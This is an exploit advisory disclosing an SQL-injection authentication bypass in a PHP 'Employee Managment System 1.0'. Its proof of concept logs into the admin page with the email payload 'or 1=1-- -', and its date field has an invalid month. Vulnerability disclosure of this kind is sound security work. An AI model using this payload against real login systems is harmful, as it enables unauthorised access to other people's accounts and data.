# Employee Managment System - Authentication Bypass
+ **Exploit Title:** Employee Managment System - Authentication Bypass
+ **Date:** 2024-30-01
+ **Exploit Author:** Burak Sevben
+ **Vendor Homepage:** https://code-projects.org/employee-management-system-in-php-with-source-code/
+ **Software Link:** https://download.code-projects.org/details/4af079c9-ab82-4b2a-a133-be6989c7f70e
+ **Version:** 1.0
+ **Tested on:** Windows 11 Home + PHP 8.2.12, Apache 2.4.58
+ **CVE:** Reported, waiting for CVE number.

## Description:
Employee Managment System 1.0 allows Authentication Bypass via the `E-mail` and `Password` parameters at "http://localhost/370project/process/aprocess.php". 

## Proof of Concept:
+ Go to this address: "http://localhost/370project//alogin.html"
+ Email : `'or 1=1-- -` Password : `1`  and log in
+ Authentication Bypass Successful !

![Ekran görüntüsü 2024-01-30 155140](https://github.com/BurakSevben/CVEs/assets/117217689/3da05a05-bb11-427d-985c-a050aa17edce)

![Ekran görüntüsü 2024-01-31 174450](https://github.com/BurakSevben/CVEs/assets/117217689/fd9c9640-aec5-4381-bc2a-b79f642cdfd2)
